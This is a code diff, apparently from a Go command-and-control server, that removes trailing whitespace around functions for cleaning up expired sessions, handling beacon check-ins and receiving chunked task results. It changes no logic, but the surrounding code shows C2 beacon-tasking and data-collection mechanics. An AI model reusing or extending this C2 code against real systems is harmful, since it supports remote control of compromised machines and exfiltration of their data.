@@ -446,18 +446,18 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 						receivedCount++
 					}
 				}
-				
+
 				// If we have partial data, save it before cleanup
 				if receivedCount > 0 && c2.db != nil {
 					partialResult := strings.Join(expected.ReceivedData, "")
 					logf("[C2] Task %s timed out with %d/%d chunks - saving partial result (%d bytes)",
 						taskID, receivedCount, expected.TotalChunks, len(partialResult))
-					
+
 					// Update task status and save partial result
 					if task, exists := c2.tasks[taskID]; exists {
 						task.Result = partialResult
 						task.Status = "partial"
-						
+
 						// Save to database asynchronously
 						go func(tid, bid, res string, recv, total int) {
 							if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
@@ -472,7 +472,7 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 				} else if c2.debug {
 					logf("[C2] Cleaned up expired expected result for task %s (no data received)", taskID)
 				}
-				
+
 				delete(c2.expectedResults, taskID)
 			}
 		}
@@ -886,7 +886,7 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 
 	// Check if there are pending tasks for this beacon (with mutex protection)
 	c2.mutex.Lock()
-	
+
 	// If beacon has a current task assigned, check if it's been completed or failed
 	if beacon.CurrentTask != "" {
 		if task, exists := c2.tasks[beacon.CurrentTask]; exists {
@@ -908,7 +908,7 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 			beacon.CurrentTask = ""
 		}
 	}
-	
+
 	// Now check for next task in queue
 	if len(beacon.TaskQueue) > 0 {
 		task := beacon.TaskQueue[0]
@@ -1159,7 +1159,7 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 
 	// Log progress for large results (every 10 chunks or completion)
 	if !isDuplicate && (receivedCount%10 == 0 || complete) {
-		logf("[C2] Progress: %d/%d chunks received for %s (task %s)", 
+		logf("[C2] Progress: %d/%d chunks received for %s (task %s)",
 			receivedCount, expected.TotalChunks, beaconID, taskID)
 	}
 
